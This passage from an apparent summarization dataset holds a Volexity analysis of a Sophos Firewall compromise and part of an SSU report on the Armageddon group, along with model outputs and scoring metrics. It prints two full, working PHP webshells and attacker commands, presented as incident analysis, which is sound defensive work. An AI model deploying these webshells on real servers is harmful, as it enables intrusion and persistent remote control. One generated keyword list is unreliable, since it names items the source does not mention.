Threat Intelligence customers in TIB-20220408 and TIB-20220429.)In this blog post, Volexity will discuss the following:Actions the attacker took after successfully compromising the Sophos Firewall How the attacker used session cookies collected via MITM attacks to compromise external systems outside of the network where the firewall resided Webshells and malware installed by the attacker, and actions taken on the external system after successful compromise1/7Recommendations to monitor for similar compromises in your networkAn overview of the attack flow is given below:Breaching the FirewallVolexity first identified intrusion activity after detecting suspicious traffic originating from the Sophos Firewall to key systems in its customer\u2019s networks. It was quickly determined the device was likely compromised, and an investigation immediately followed. Volexity first collected memory from the device, and later collected a full disk image to assist in its investigation. Volexity suspected the external-facing User Portal component of the Sophos Firewall might be involved; it was a likely attack vector given it was the only Internet-exposed component of this network. As a result, Volexity reviewed the web access logs for the device before starting other analysis tasks. These logs revealed significant and repeated suspicious access aimed at a valid JSP file (login.jsp), as shown in this sample log entry:[07/Mar/2022:09:25:58 +0000] <redacted> \"POST /userportal/webpages/myaccount/login.jsp HTTP/1.1\" 200 - 0 \"https:// <redacted>/userportal/jlbed/fikds4/BQ.jsp\" \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36\"These requests show a successful HTTP 200 status code. However, inspection of the underlying code for \"login.jsp\" did not show any anomalies or modifications that would lead Volexity to believe this file had been backdoored. It should be noted that the file \u201cBQ.jsp\u201d, seen in the Referrer field, does not exist as part of the User Portal.At this point, Volexity implemented a plan to set up a packet capture on the device to intercept inbound web requests. The attacker was active when Volexity did this, so it did not take long to capture traffic and confirm this traffic was out of the ordinary.Figure 1. DriftingCloud interacting with a webshell on the Sophos FirewallPrior to capturing network traffic, Volexity captured system memory using Volexity Surge Collect. Data observed from network traffic further aided the investigation of the memory sample. The network traffic combined with analysis of the memory sample proved to be productive for piecing together various aspects of the attacker\u2019s activity.2/7One item identified was the presence of large base64 strings adjacent to suspicious requests made to the User Portal component of the device (Figure 2) similar to those seen in Figure 1.Figure 2. Example suspicious strings in memoryUsing the adjacent strings as a pivot point, Volexity searched on the firewall\u2019s disk for files containing strings similar to those adjacent to the base64 blobs in memory. In doing so, Volexity identified the following legitimate component of the firewall had been modified by the attacker:/usr/share/webconsole/WEB-INF/classes/cyberoam/sessionmanagement/SessionCheckFilter.classThe investigation revealed the attacker timestomped this file, so its last modify time was the same as other files in this directory. This CLASS file is a legitimate component of the Sophos Firewall. Its purpose is to call SessionCheckHelper with correct parameters based on the current URI, which in turn verifies that the user has a valid session (and if not, it directs them to log in). Without reverse-engineering the firewall's web UI, Volexity assumes this helper is called when any request is made to any component of the Sophos Firewall\u2019s portal. The attacker created their own version of this file containing malicious logic. A decompilation of the malicious file using ByteCodeViewer is shown in Figure 3.Figure 3. A decompilation of the malicious SessionCheckFilter.class fileIn summary, the malicious code added to SessionCheckFilter.class used the following workflow:Check that the incoming request URI or \u201cAccept\u201d HTTP header contains the string \u201cApplicationssid\u201d; if this fails, proceed with legitimate functionality. Check that the incoming request is a POST; if this fails, proceed with legitimate functionality. If both checks pass, decode the POST body using base64 and AES using the key \u201ca918c0e8d8153bfc\u201d; this is likely a partial (16 character) MD5 of a plaintext password used on the attacker's side. The result of the decode should be another CLASS file which is loaded using SecureClassLoader.This workflow effectively backdoored the Sophos Firewall with a webshell that could be accessed through any URL of the attacker\u2019s choosing. The attacker attempted to blend in by accessing this webshell through requests against the \"login.jsp\" file. At first glance, this might appear to be a brute-force login attempt instead of an interaction with a backdoor. The only real elements that appeared out of the ordinary in the log files were the referrer values and the response status codes. CLASS files are compiled and not simply text files, which makes an edit like this not as trivial3/7as with similar webshell cases. It is likely the attacker decompiled the class (either by retrieving it from the firewall, or from a local firewall used for testing), and then created their own version locally before re-compiling it and placing it on the device.Volexity decoded some requests made by the attacker using this webshell and found the attacker was using the publicly available BEHINDER framework. It is interesting to note that this is the same framework Volexity believed was leveraged by one or more Chinese APT groups involved in the recent zero-day exploitation of Confluence Servers systems by way of CVE-2022-26134. Additional Findings from the FirewallIn addition to this webshell component, Volexity identified several other actions performed by the attacker on the Sophos Firewall that further compromised the victim and ensured persistence.The attacker created VPN user accounts and associated certificate pairs on the firewall to facilitate legitimate remote network access. As part of the exploitation of the Sophos Firewall, the attacker wrote and executed a file on disk at the following path:/conf/certificate/pre_install.shWhen executed, the \"pre_install.sh\" file runs a malicious command to download a binary, execute it, then delete it from disk. At the time of analysis, the binary was absent from the command-and-control (C2) server, and it was not present in memory or on disk. This file did not appear to be a legitimate component of the firewall.Moving Beyond the FirewallWhile gaining access to the target's Sophos Firewall was likely a primary objective, it appears this was not the attacker's only objective. Volexity discovered that the attacker used their access to the firewall to modify DNS responses for specially targeted websites in order to perform MITM attacks. The modified DNS responses were for hostnames that belonged to the victim organization and for which they administered and managed the content. This allowed the attacker to intercept user credentials and session cookies from administrative access to the websites' content management system (CMS). Volexity determined that in multiple cases, the attacker was able to access the CMS admin pages of the victim organization's websites with valid session cookies they had hijacked.The log snippet below shows the first interaction with a victim web domain by the attacker:172.x.x.x - - - - [16/Mar/2022:08:19:57 +0000] \"target.tld\" \"GET /wp-admin/ HTTP/1.1\" 200 46067 \"- \" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"Using these session cookies, the attacker was able to directly access the WordPress admin panel without sending a username and password, and they accessed a page that allows installation of additional plugins:172.x.x.x- - - - [16/Mar/2022:08:22:04 +0000] \" target.tld \" \"GET /wp-admin/plugins.php HTTP/1.1\" 200 42941 \"url\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\u201d 172.x.x.x - - - - [16/Mar/2022:08:22:07 +0000] \" target.tld \" \"GET /wp-admin/plugin-install.php HTTP/1.1\" 200 41547 \"url\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"The attacker then searched for the File Manager plugin and installed it. This plugin can be used to perform file management tasks on the website, such as uploading, downloading, editing, or deleting a file:172.x.x.x - - - - [16/Mar/2022:08:26:21 +0000] \"target.tld\" \"GET /wp-admin/plugins.php? _wpnonce=13241af34c&action=activate&plugin=wp-file-manager/file_folder_manager.php HTTP/1.1\" 302 0 \"url\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.x.x\" 172.x.x.x - - - - [16/Mar/2022:08:26:22 +0000] \"target.tld\" \"GET /wp-admin/plugins.php? activate=true&plugin_status=all&paged=1&s= HTTP/1.1\" 200 43523 \"url install.php?s=file%20manager&tab=search&type=term\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.x.x\" 172.x.x.x - - - - [16/Mar/2022:08:26:43 +0000] \"target.tld\" \"GET /wp-admin/admin.php? page=wp_file_manager HTTP/1.1\" 200 37492 \"url\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.x.x\"Having successfully installed the File Manager plugin, the attacker used it to upload a PHP file, placing it in the March 2022 WordPress uploads directory:172.x.x.x - - - - [16/Mar/2022:08:29:16 +0000] \"target.tld\" \"GET /wp-admin/admin-ajax.php? action=mk_file_folder_manager&_wpnonce=1fead1b621&networkhref=&cmd=ls&target=l1_d3AtY29udGXteC71cGxvYWRzLzIwMjEvM <redacted>.php&reqid=1b191dc2be41a2 HTTP/1.1\" 200 11 \"url /wp-admin/admin.php?4/7page=wp_file_manager\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"Finally, the attacker deactivated the File Manager plugin:172.x.x.x - - - - [16/Mar/2022:08:32:01 +0000] \"target.tld\" \"GET /wp-admin/plugins.php? action=deactivate&plugin=wp-file- manager%2Ffile_folder_manager.php&plugin_status=all&paged=1&s&_wpnonce=bc1ca29a43 HTTP/1.1\" 302 0 \"url\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"The webshell was fairly short and consisted of the following PHP code, which appears to be a variation on the Weevely webshell:<?php $J='Ktch(\"/K$kh(.+K)K$kf/\",@fileK_get_contents(\"pKhpK://inpuKt\"K),$m)'; $e='==1) {@oKb_stKart();@eKval(K@gzuncKomprKess(@x(@bKase64_KdecKode(; $P=str_replace('VG','','cVGreaVGtVGVGe_fVGunVGction'); $l='$k=\"1506aKdbd\";$Kkh=\"7eKfK1ee10Kd884\";$kf=\"9K82K58e20d7a0\"K;'; $C='K$p=\"Kwton3r3P7tKKHoi9Uk\";functioKn Kx($Kt,$k){$c=stKKrlen($k)KK;$l=s'; $B='trlen(K$t);$oK=\"\";for($iK=K0;$i<$lK;){for($jK=K0;($j<$cK&&$i'; $X='r=@bKase64_enKcode(K@x(@gzcoKmpKKrKess($o),$k));printK(\"$p$kKh$r$kf\");}'; $W='m[1K]),K$k)));$KKo=@ob_get_contKentKs();@ob_KendK_clean()K;$y='<$l);$j++K,$i++K)K{$o.K=$t{$i}^$Kk{$j};}}reKturn K$oK;}if (@pregKK_ma'; $a=str_replace('K','',$l.$C.$B.$y.$J.$e.$W.$X); $S=$P('',$a);$S(); ?>This is a simple shell that reads the file input, base64 decodes it, decompresses it, and then runs an eval() on the resulting PHP statement. Evidently this was not the attacker's preferred shell, however, as they quickly installed a second shell with a name based on an existing PHP file. This is a popular webshell that appears to go by many names, including IceScorpion, and has the following contents:<?php $key=\"aece158[snipped]\"; //32md516\uff0crebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?>This has similar functionality but uses AES128 encryption with a hardcoded password \u201caece158afa2f0f49\u201d. This is the main shell that the attacker used in subsequent exploitation. Based on both PCAPs relating to this shell, other logs on the system, and analysis of the memory image using Volexity Volcano, Volexity was able to piece together a number of commands issued by the attacker. Some interesting observations are provided below:The attacker cloned a GitHub repository for CVE-2021-4034 in an attempt to escalate their privileges. After this did not work, the attacker downloaded a custom implementation of the shared object (db.py) of the same exploit from a Github page owned by the attacker (which has since been taken down) .5/7Figure 4. \"Gooogleapis\" GitHub user and repository containing tools related to compromise of Sophos Firewall devicesThe same GitHub page also included a Sliver binary named \u201ckstrp\u201d. Volexity did not observe this specific file on an infected system or in any command. This could suggest that the same repository was used in operations against other targets. The attacker also downloaded another file via wget which is believed to have been another attempt at privilege escalation on the web server. This file appears to have been an attempt to exploit CVE-2021-4034.wget url -O /tmp/x.pyThe attacker used their access to this webserver to install three open-source malware families, including PupyRAT, Pantegana and Sliver. Volexity did not find anything too remarkable about the usage and deployment of these backdoors. However, Volexity did find the server-side configuration for the Pantegana malware to be worth noting: the attacker attempted to operate as \u201cThe SWAG\u201d via \u201cSWAG, Inc.\u201d. This looks to be a custom implementation, as it was found to differ from the default certificate.Figure 5. Customised SSL certificate leveraged by the Pantegana malware, shown in BinaryEdge ConclusionDriftingCloud is an effective, well equipped, and persistent threat actor targeting five-poisons-related targets. They are able to develop or purchase zero-day exploits to achieve their goals, tipping the scales in their favor when it comes to gaining entry to target networks. It is critical for organizations that support or consist of targeted groups to have network monitoring solutions in place in order to identify compromises when they inevitably occur. Compromise of gateway devices is a frequent root cause for incidents investigated by Volexity, and compromising them often gives attackers a lead on defenders who are often focused on endpoint and EDR solutions which are not present on these devices.Sophos has published advice on mitigating this vulnerability in their advisory. Specifically, the advisory states the following:\"Sophos has observed this vulnerability being used to target a small set of specific organizations primarily in the South Asia region. We have informed each of these organizations directly. Sophos will provide further details as we6/7continue to investigate. There is no action required for Sophos Firewall customers with the \"Allow automatic installation of hotfixes\" feature enabled. Enabled is the default setting.\"To generically identify similar attacks to those discussed, Volexity recommends the following:Deploy network security monitoring and other mechanisms to detect and record traffic from gateway devices. For Unix-based webservers, consider using auditd to enable easier investigation in the event of compromise. Ask vendors of perimeter devices (such as firewalls) what capabilities they have to detect a compromise, and what methods would be available for you to investigate a compromise if one were to occur. Some vendors do not allow access to perimeter devices which can complicate investigations of suspected compromise.To prevent these specific attacks from being successful, Volexity recommends the following:Use the YARA rules listed on GitHub here to identify suspicious related activity. Block the IOCs listed on GitHub here.Related Indicatorsakamprod[.]com u2d.servusers[.]com servusers[.]com googleanalytics.proxydns[.]com ", "generated_text": "Volexity; Chinese; advanced persistent threat; APT; March; information; access; the firewall; compromise; a backdoor; system info; persistence; webshells; malware; the attacker; keyloggers; malicious web shells; MIME; compromise; Windows; the server; the attacker; The report; recommendations; this nature; these attacks.", "ref_text": "<START-1>The PDF describes research by Volexity into a sophisticated cyberattack campaign targeting organizations of interest to Chinese threat actors. The attackers exploited a zero-day vulnerability in Sophos firewall devices to gain initial access. Volexity detected the intrusion through anomaly detection and forensic investigation of the compromised firewall. The attackers had installed a malicious Java class file to create a backdoor on the firewall's web interface. This provided persistent access using the publicly available BEHINDER webshell framework. The attackers then performed man-in-the-middle attacks to intercept credentials and cookies for externally hosted websites belonging to the victim organization. They leveraged the stolen cookies to remotely access the website's admin console and install PHP webshells for further access. Web server compromise was used to install backdoors like PupyRAT, Pantegana, and Sliver. Privilege escalation attempts were also observed. The campaign exhibits sophistication through exploitation of a zero-day vulnerability, custom webshells, and operational security measures. Volexity attributes the activity to a Chinese threat actor group they track as DriftingCloud based on TTPs. The incident highlights risks of gateway device compromise and need for network monitoring to detect advanced persistent threat activity. Recommendations are provided for detection and prevention of similar attacks. In summary, the report analyzes an advanced cyberespionage campaign that combined a firewall zero-day exploit with strategic web server compromises to gain access and persist within a targeted organization's network. <END-1>", "t5/keyword/hint_hit_precision": 0.4230769230769231, "t5/word/hint_hit_recall": 0.0752212389380531, "gpt3/lexical/rouge_rouge1": 0.3903903903903904, "gpt3/lexical/rouge_rouge2": 0.10271903323262839, "gpt3/lexical/rouge_rougeL": 0.1921921921921922, "gpt3/lexical/rouge_rougeLsum": 0.1921921921921922, "gpt3_generated_text": ["In March 2022, Volexity detected a sophisticated attack by a Chinese APT group, known as DriftingCloud, against a heavily targeted customer using a zero-day exploit to compromise their Sophos Firewall. The attacker implemented a webshell backdoor, created secondary persistence, and launched attacks against the customer's staff to breach cloud-hosted web servers. The attacker conducted MITM attacks using session cookies collected from the firewall to compromise external systems. Sophos released an advisory on the RCE vulnerability (CVE-2022-1040) exploited in the attack. Volexity recommends monitoring for similar compromises and defending against attacks of this nature."]}, {"split_name": "val", "sample_id": "val_49", "prompt_text": "Extract the keywords: IntroductionWithin conducting hybrid aggression against Ukraine, since 2014 Russian Federation special services launched an open intelligence and sabotage activities.For that purpose, the capabilities of the existing cyber units have been strengthened and new units were created. Individuals were actively involved in organizing and conducting cyberattacks. The Security Service of Ukraine has reliable data concerning cyberattacks by APT28 (Sofacy/Fancy Bear), SNAKE (Turla), APT29 (Cozy Bear/The Dukes). At the same time, some of the results of the criminal activities of these groups are well known to the public as targeted cyberattacks BlackEnergy, Industroyer and NotPetya.Comparing with mentioned APT,the hacker group \"Armageddon\" is relatively young, according to various sources \u2013 2013-2014, and were \u201cunder radar\u201d in the beginning of activities. Also it needs no less attention from the competent authorities. Under relevant circumstances, the group is able to turn into a cyberthreat with consequences, the scale of which will exceed the negative effect of the activities of mentioned APT groups.investigationThe outcomes ofinto cyber-attacks associated with the activities of the hacker group \"Armageddon\" are occasionally published in the reports of anti-virus laboratories and companies dealing with cybersecurity and providing cybersecurity services.The Security Service of Ukraine considers to share with the Ukrainian and world community its own vision of this cyberthreat and tries to shed more light on the group's cyber operations, their purpose, tactics, techniques and procedures used by hacker groups, their evolution.The information is provided by the Security Service of Ukraine to the extent that takes into account the legal restrictions on the regime of access to information.The hacker group\u2019s \"Armageddon\"/\"Armageddon\"profileThe Security Service of Ukraine classifies the hacker group \"Armageddon\" as APT (Advanced Persistent Threat), and unambiguously identifies it as a specially created structural unit of the Federal Security Service of the Russian Federation, whose tasks are intelligence and subversive activities against Ukraine in cyberspace.namesare GamaredonBearOther well-known(Eset, (PWC)/IronTiden (SecureWorks)/SectorC08 (Red Alert), Callisto (NATO Association of Canada). The group is an integral part of the so-called \"Office of the FSB of Russia in the Republic of Crimea and the city of Sevastopol\", and consists of regular officers of the secret service and some former law enforcement officers of Ukraine.The Security Service of Ukraine believes that Armageddon was formed and has been operating since 2014 (some sources on the Internet indicate June 2013). The main purpose of its activity is to conduct targeted cyberintelligence operations against state bodies of Ukraine, primarily security, defense and law enforcement agencies, intelligence information.in order to obtainThe activity and development ofthe hacker group \"Armageddon\" during 2014-2021 has led to the existence of a new real cyber threat. In the period 2017-2021 this group implemented the most numerous cyberintelligence actions on various vectors of public administration.Armageddon does not use complex and sophisticated techniques, tactics and procedures, does not try to make an effort to stay secret for a long time. Staying off the radar is not a group priority.However, the group's activities are characterized by intrusiveness and audacity. It is evidenced by the name of the group \"Armageddon\", which information contained in the metadata of the first created documents-baits;is taken from thecyber attacks algorithm repeatability and regular mass sending of malicious messages to the same circle of addressees; derogatory password phrases encoded in malicious software, etc.The cyber attack mechanism is based on the principle of simultaneous mass destruction of a large number of users inside one organization and the deployment of malicious software. When the victim's computer system loses control, the attackers try to regain access to the source of the information and try again to compromise them according to a similar scenario.Malicious software modules have been created with the help of programming languages VBScript, VBA Script, C#, C++, as well as using CMD, PowerShell and .NET command shells.In fact, the group focuses on computer systems running the Windows, although we know about the test use of the EvilGnome malware (to defeat Linux systems), as well as attempts to get access to Android devices.Analysis of the group's tactics since its first appearance on the \"landscape\" of cyberspace allows us to divide its activities into 2 periods: from 2014 to 2017 and from 2017 to the present day. This divide is due to the evolution of tools.Though, there is little information about Armageddon's early days, based on the available data, members of the group relied on legitimate, publicly available software products in the early years of their existence, which was eventually changed to customized malware Pterodo/Pteranodon.At the first stage, the minimum required set of software consisted of dropper files sent with phishing emails, as well as remote access tools, which were installed after users opened malicious applications and provided to include RMS (Remote the information system. Such tools Manipulator System) and UltraVNC.remote accessThe second stage, starting in 2016, is characterized by the transition to customized malware called Pterodo/Pteranodon, which widely expanded the functionality of the group.Phishing as a guarantee of an effective cyberattackThroughout its existence, the hacker group \"Armageddon\" has successfully used the methods of social engineering, especially sending to potential victims emails specially crafted messages with malicious attachments. This remains the main vector of cyberattack.This approach does not require significant costs, and information about the official mailing addresses of a government agency, unit or an official can be found in open sources.the movement ofin the Donetsk and Luhansk regions,Thus, 2014-2016 are characterized by sending emails on topics related to the Anti-Terrorist Operation (now the Joint forces and means, loss of personnel and military equipment, facts of desertions, analytical data on the activities of units of the security and defense sector of Ukraine. The targets were, respectively, military personnel of the security and defense sector of Ukraine, representatives of law enforcement agencies and other individuals who were involved in the Anti-Terrorist Operation/the Joint Forces Operation.Subsequently, in 2017-2019, due to the partial cessation of lure active hostilities, the emphasis was shifted towards documents on criminal proceedings, international cooperation, draft legislation, with a simultaneous reorientation to users of the central offices of the security and defense sector of Ukraine (Figures 1 and 2).Figure 1. A Phishing email sampleA simple method of putting pressure on the user was applied in many e-mails so that an electronic attachment was opened recklessly. The word \"Urgent\" was indicated in the title and/or text of the message, which was to force the employee to review the contents immediately and start the system infecting process accordingly.From 2019 to the present day, almost half of such e-mails have been allegedly sent on behalf of state bodies, international organizations and individuals, and the lure documents became correspondence letters of Ukrainian state bodies. At this stage, Armageddon is trying to expand its presence and carry out its cyberattacks on information systems of employees of central executive bodies in particular.international andinformation,Figures 2. One more phishing email samplea message,According to the phishing e-mail samples analysis results, the systematic facts of real recipients replacement is worth noting. Usually, the field \"address from\" indicates the data (primarily the domain name) that corresponds to a real government agency, in particular, from which the recipient can at the appropriate time. The subject of the letter, its content and the title of the appendix reflect current information, which gives the letter even more legitimacy. Thus, a specially formed fake letter creates the illusion of credibility and encourages users to read the contents of the attached documents without suspicion. So, the opening of such applications by officials triggers the mechanism of downloading malicious software and infecting the information system.includingIt can be argued that special attention is focused on the investigative units of law enforcement agencies, which have been handling thousands of criminal cases since the beginning of the Russian armed aggression against Ukraine.In reality, the Armageddon group created numerous mailboxes on the existing public services of Russia (@yandex.ru), Ukraine (@i.ua), the Czech Republic (@popis.cz, @post.cz andlocated@email.cz), from which fake messages were actually sent. At the same time, such mailboxes were used as a cover for sending mails from pre-configured for this purpose mail servers, which were in Russia and on the territory temporarily not controlled by Ukraine. The Security Service of Ukraine is aware of the facts of sending fake e-mails with malicious software from computers that used Russian IP-addresses (IpServer, IT Expert providers), including the Crimean telecom provider Crelcom (Simferopol).The mailbox \"lifetime\" was usually no more than a month, but there were some cases of sending fake messages from one mail for a much longer period.Figure 3. A phishing email sample with embedded hide pixelA specific feature of the 2019 letters was the embedded hidden pixel into their bodies, which was implemented due to the capabilities of the HTML markup language (Figure 3). For example:<imgsrc=url cached.gif height=\u00ab0\u00bb width=\u00ab0\u00bb style=\u00abheight:0px;width:0px\u00bb>At the same time, the minimal size parameters of the image set up by the attackers and its placement on the screen do not allow ordinary users to notice it. This feature allows hackers to track users who have read the email but have not opened the malicious attachment for unknown reasons.So, the implementation of a cyberattack begins with sending a phishing letter with a malicious attachment to a potential victim, the mechanism of automatic system and creating the preconditions for information leakage is launched.the opening of whichthe computerUsed VulnerabilitiesThroughout the period of its activity, the hacker group\"Armageddon\" has been actively using 2 known vulnerabilities.Thus, up to version 5.70, the most popular data compressor contained the WinRAR ACE vulnerability (CVE-2018-20250), which allows to place files from archive to any folder on a victim\u2019s disk automatically, the background mode without victim\u2019s permission. Due to this, the attackers uploaded malicious files to various directories, which are used in Windows for automated launch of user programs (StartUp). This created the opportunity of persistent presence in the victim\u2019s information systems and regular malware launches.inIt is worth noticing that this vulnerability had existed for almost 20 years and became known only in 2019. The developers have now fixed this bug, so users need to update the WinRAR software to the latest version.Vulnerability of CVE 2017-0199 has been known since 2017 as Microsoft Office Remote Code Execution Vulnerability and allows to execute arbitrary code in the victim's system remotely after documents with the extension .rtf, .docx, .doc are opened.Tactics, Techniques and Procedures Evolution With the goals of obtaining documentary files from the systems of Ukrainian state bodies, the hacker group\u2019s TTPs \"Armageddon\" have gone through several stages of their evolution.(TTPs)Malicious software was intended to provide remote access to the system, the ability to execute commands on it, data collection and exfiltration, distribution to systems without an Internet connection (via removable data storages) etc.It is worth mentioning that in terms of architecture and implementation complexity, the used tools are not sophisticated, but have proven to be quite effective. Throughout the period of criminal activity, the group did not show a desire for lateral movement within the network. The group\u2019s TTPs provided mass compromising of user\u2019s systems as a result of malware targeted delivery to them and infecting each individual system. That happened until 2021.As it was already stated, the group uses droppers to deliver malware, which are delivered via malicious e-mails. At the stage of its installation an archive in SFX format was sent to the victim together with a phishing letter. While unpacking this the Remote Manipulator System (developed by the Russian company \"TektonIT\") was deployed.At the final stage, the deployment of remote access tools, as well as tools for collecting information takes place. At the stage of its formation with the phishing letter, in an archive SFX format, Remote Manipulator System (developed by the Russian company \"TektonIT\") was sent to the victim.However, almost immediately, it was replaced by another remote access tool, the use of which is still recorded, \"UltraVNC\" (Figure 4) - free software for the Windows operating system that uses the VNC protocol (a tool for remote management of other information systems).Figure 4. UltraVNCThe group was also looking for software with the ability to identify and retrieve data from removable data storages, as well as isolated (not connected to the Internet) information systems. From 2014 to 2016 it is known about the usage of the file ChkFlsh.exe (mikelab.kiev.ua).At the same time, the main tool of the hacker group Armageddon from 2016 has been malicious software Pterodo, which actually allowed to solve key issues of deployment in the targeted system, securing and conducting intelligence activities.Pterodo/Pteranodon malwarePterodo malware is a customized remote administration tool which has a modular structure and covers a wide range of different functions, namely:- before performing malware tests the environment in which it runs and tries to identify Sandboxes; - downloads and uses additional modules; - takes screenshots at a specified frequency; - gets access to cameras and a microphone (if available); - provides the ability to remotely execute commands within the system;- checks connected removable data storages and copies itself on/from for distribution to the systems that are separated from the Internet.It is known that the core of Pterodo has been publicly available on Russian hacker forums from 2016, and one of the detected modules responsible for decrypting the data was posted on Github by a user with the nickname \"asu2010\" and was also described on the Russian Internet portal Habrahabr.Pterodo is a type of malware that is designed for Windows and is aimed at defeating the version from Windows XP to Windows 10.Today, Pterodo has changed a lot. During the period of active monitoring of the group's activities and the results of cyberattacks investigations, the Security Service of Ukraine has looked into a large number of malware samples, on the basis of which it was concluded that several methods of implementation had changed.The use of malware Pterodo on continuing basis began in 2017. The main idea of it was making the existing modules collection and their packaging into the archive. Also, a lure document was necessarity added to the archive, which is displayed to the user to hide suspicion of unauthorized actions.After opening the received application (self-extracting archive with extension files .dll and .cmd, Figure 5), malicious modules are downloaded to certain directories and executed in hidden mode.Figure 5. A set of malware files in one of the casestheoperatingThe virus provides the following actions: the virus copies folders its files to %APPDATA%\\Microsoft\\Windows\\Start and Menu\\Programs\\Startup, and registers itself in the task scheduler (Figure 6) in order to wait for action from the command & control server (C2).systemstartupIn earlier versions, command & control servers were hard- coded, but from 2019 the SSU noticed additional configuration files with backup \u04212 list.Figure 6. An example which demonstrate unauthorized scheduler taskThe algorithm for unpacking, placing files into directories and their subsequent launch is encoded in a tron.cmd. This file is a orchestrator which is responsible for managing the entire package of malicious modules.The LocalSMS.dll file is a dropper that communicates with the command & control server and loads other modules. In order to do that, the information about the computer is collected: computer name, user list, list of logical drives in the system, installed updates, etc. All this information is written to a file and sent to a specific server. In many cases, the malware has the functionality of dumping credentials for authorization on the internal proxy server from the OS registry, and its application if necessary (Figure 7).Figure 7. Code for dumping proxy credentialswinrestore.dllis a tool responsible for creating andcollecting screenshots.It should be noted that the set of modules changed with every new wave of attack, with the expectation of loading the necessary components after fixing in the system (depending on current needs). At the same time, the servers are configured in such way that attempts to load the malware components for research were unsuccessful, and the server response was 404 Not Found. This is due to additional settings/parameters of the request (for example, the IP is not in the white list to which you can download further malware from the link, inappropriate user agent). This filters computers that are of interest to the attacker.During the period 2018-2019, together with the SFX- archives, the victims received letters with attached .scr files (screensaver), which masked the standard .exe extension for such file types.This file contains a thematic office document (no macros),as well as a malware dropper.The last file is a free WGET console bootloader that connects to the command server and downloads a new software module that uses the systeminfo command to generate a list of required information and the name of the bot generated from the PC name and logical drive serial number (%computername% _logicaldiskserial). After sending system information, in response, the main function modules are loaded, which allow remote execution of commands. The task scheduler creates a task to periodically run of the malware in order to have resilience for rebooting.Another mechanism for downloading malware modules was to create an allegedly attached archive file in an email using HTML, which, when clicked, communicates to a remote server using a specific download link. Thus, the first-stage malware was delivered to the victim's information system.At the same time, it turned out that depending on the operating system and the transition time, the victim received different content. On the day of the investigation, before 10 a.m, the .scr archive was downloaded, and after 11 a.m., the .rar archive was downloaded from the same link.At some time, when communication initiates from a mobile Android device, the user's browser redirected to the phishing page Google Play url [.]com/ (hosting provider Expert Llc). However, the download did not take place, and the page of the real Google market service was opened (Figure 8). Thus, we can assume the deployment of these resources to conduct a cybercampaign to compromise mobile terminals.Figure 8. Content view for mobile devicesDuring this period, the Security Service of Ukraine also found some sample files that contained Windows Management Tools (WMI) commands to determine the location of the information system, as well as the use of non-numerous scripts on PowerShell.PowerShellThe Security Service of Ukraine has detected Armageddonusing two types of PowerShell scripts.One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module \u2013 the executable file with its simultaneous hidden start (Figure 9).Figure 9. PowerShell script exampleAnother script file contained 4039 lines of program code. At the same time, PowerShell commands were actually intended to execute code in the C# programming language. Analysis of this code showed that its functional purpose was to connect to the command & control server the appropriate domain, retrieve data from it, loaded data into the executable file and to run it (Figure 10).inFigure 10. PowerShell script example with C#However, it should be noted that only about 200 lines of code are actually functional. All other lines are generated only for distraction, which can be attributed to the program code obfuscation technic.In fact, the first stage now lies in downloading the WGET console utility and scripts to run it, set up persistence for rebooting by making changes to the registry and/or task scheduler, as well as collecting information about the system (computer name, disk name, IP-address, login and password to access the Proxy) and send the collected information to C2 (Figure 11).Figure 11. Sending data to command & control serverintheIn many batch files, the use of commands that changed the byvalues \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\A dvanced\\Hidden\" to \"00000002\" was noticed, which allows to corresponds to changing the parameter show hidden files, folders and drives in the folder settings.the user. Thisregistryfiles andfoldersfromHaving created conditions for constant presence in the system and receiving constant requests from the victim's system, the group filters bots with the main malicious software.Also since the end of 2019, Armageddon started to implement VBSscipts, which completely replaced cmd files later and became the malware Pterodo persistence and download new specialized modules.the main scripts into be deployedfor the system,Full usage of VBSscipts group has begun in 2020 and hasn\u2019t been stopped till this day. The conditions for this are actually created due to the existence of the CVE 2017-0199 vulnerability.By examining the code of numerous files and their relationships, it is possible to draw conclusion aboutthe following mechanism of compromising the victim's system. The recipient receives and opens an office electronic document (.docx, .doc, .rtf format) with a built-in file link to download a remote template. In response, a template file (.dot) is sent with built-in macros, the execution of which provides the initial stage of the information system compromising. This mechanism can be implemented in MS Word, Exel, PowerPoint (Figure 12).Figure 12. Built-in reference to download a dot fileAs a result, the malicious VBA code deletes the Windows DNS cache using the ipconfig/flushdns command, decodes the Base64 strings, places the vbs file in the specified way, writes the code to it, and finally creates a task in the task scheduler on behalf of Administrator to run this file using VBS (wscript.exe - standard Windows utility for executing VBS scripts) with a certain frequency (for example 5 minutes) every day.HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersi on\\Run\\LnkAt the same time, the settings of Microsoft Office Word for invisible documents damage are changed in the registry and run the malware using VBA. Changes occur in the registry branch HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\Version\\Word\\ Security with keys AccessVBom and 